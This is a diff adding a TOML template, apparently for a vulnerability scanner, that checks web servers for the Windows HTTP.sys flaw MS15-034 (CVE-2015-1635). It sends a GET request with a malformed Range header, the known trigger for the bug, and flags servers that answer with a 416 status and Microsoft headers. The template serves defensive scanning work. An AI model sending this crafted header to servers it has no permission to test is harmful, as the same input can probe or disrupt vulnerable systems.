@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "通过发送包含畸形 Range 头的 HTTP 请求检测目标服务器是否存在 MS15-034 漏洞。若服务器返回 416 状态码且响应体包含 'Requested Range Not Satisfiable'、响应头包含 'Microsoft'，则判定存在漏洞。"
+id = "POC-AVE-2015-0022"
+name = "Microsoft Windows HTTP.sys 远程代码执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2015-0022"]
+vuln_id = [
+    "CVE-2015-1635",
+    "AVE-2015-0022",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+Range = "bytes=0-18446744073709551615"
+
+[[poc.requests.matchers]]
+expect = true
+status = [416]
+type = "status"
+
+[[poc.requests.matchers]]
+condition = "or"
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Requested Range Not Satisfiable",
+    "请求范围不符合",
+]
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["Microsoft"]
